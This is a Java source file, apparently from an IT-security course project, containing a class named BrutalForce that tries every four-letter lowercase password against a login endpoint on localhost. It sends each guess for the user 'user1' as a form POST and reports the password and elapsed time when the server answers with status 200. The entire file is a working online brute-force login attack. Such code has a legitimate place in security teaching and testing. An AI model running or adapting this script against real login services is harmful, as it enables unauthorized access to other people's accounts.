package com.example.itsecurity2.scripts;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class BrutalForce {

    private String password;
    private long totalTime;
    private boolean cracked = false;

    public boolean useTheForce(String name){
        long start = System.currentTimeMillis();
        for (char first = 'a'; first <= 'z'; first++) {
            for (char second = 'a'; second <= 'z'; second++) {
                for (char third = 'a'; third <= 'z'; third++) {
                    for (char fourth = 'a'; fourth <= 'z'; fourth++) {
                        String password = "" + first + second + third + fourth;
                        if(request(name, password)){
                            this.totalTime = System.currentTimeMillis() - start;
                            this.password = password;
                            return true;
                        }
                        if(password.equals("zzzz")){
                            this.totalTime = System.currentTimeMillis() - start;
                            this.password = password;
                            return false;
                        }
                    }
                }
            }
        }
        return false;
    }

    @Override
    public String toString() {
        if(cracked){
            return "Success!\n" +
                    "Password: " + this.password + "\n" +
                    "Second passed: " + 0.001 * this.totalTime;
        }
        return "failed to find password";
    }

    private boolean request(String name, String password){
        try {
            HttpURLConnection request = (HttpURLConnection) new URL("http://localhost:8080/credentials/login").openConnection();
            request.setRequestMethod("POST");
            request.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            request.setDoOutput(true);

            String credentials = "username=" + name + "&password=" + password;

            try(OutputStream stream = request.getOutputStream()) {
                byte[] output = credentials.getBytes(StandardCharsets.UTF_8);
                stream.write(output, 0, output.length);
            }
            return request.getResponseCode() == 200;
        }catch (Exception e){
            e.printStackTrace();
        }
        return false;
    }


    public static void main(String[] args) {
        BrutalForce brutalForce = new BrutalForce();
        brutalForce.cracked = brutalForce.useTheForce("user1");
        System.out.println(brutalForce);
    }
}
